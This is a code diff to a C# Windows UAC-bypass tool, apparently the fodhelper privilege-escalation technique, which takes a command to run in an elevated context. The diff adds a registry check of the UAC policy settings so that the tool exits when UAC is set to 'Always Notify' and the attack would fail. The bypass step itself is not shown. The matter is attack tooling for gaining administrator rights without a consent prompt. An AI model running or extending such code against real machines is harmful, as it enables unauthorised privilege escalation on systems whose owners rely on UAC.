@@ -1,8 +1,6 @@
 using System;
 using System.Threading;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Linq;
 using System.Text;
 using Microsoft.Win32;
 
@@ -16,6 +14,19 @@ namespace Fodhelper_uac_bypass
             if (args.Length == 0)
             {
                 System.Console.WriteLine("Please enter the command to run in an elevated context");
+                System.Environment.Exit(1);
+            }
+
+            //Check if the UAC is set to "always notify." Exit if true as the attack will fail
+            //Stolen from enigma0x3's eventvwr bypass powershell script
+            RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+            string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
+            string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
+            alwaysNotify.Close();
+
+            if (consentPrompt == "2" & secureDesktopPrompt == "1")
+            {
+                System.Console.WriteLine("UAC is set to 'Always Notify.' This attack will fail. Exiting...");
                 System.Environment.Exit(1);
             }
 
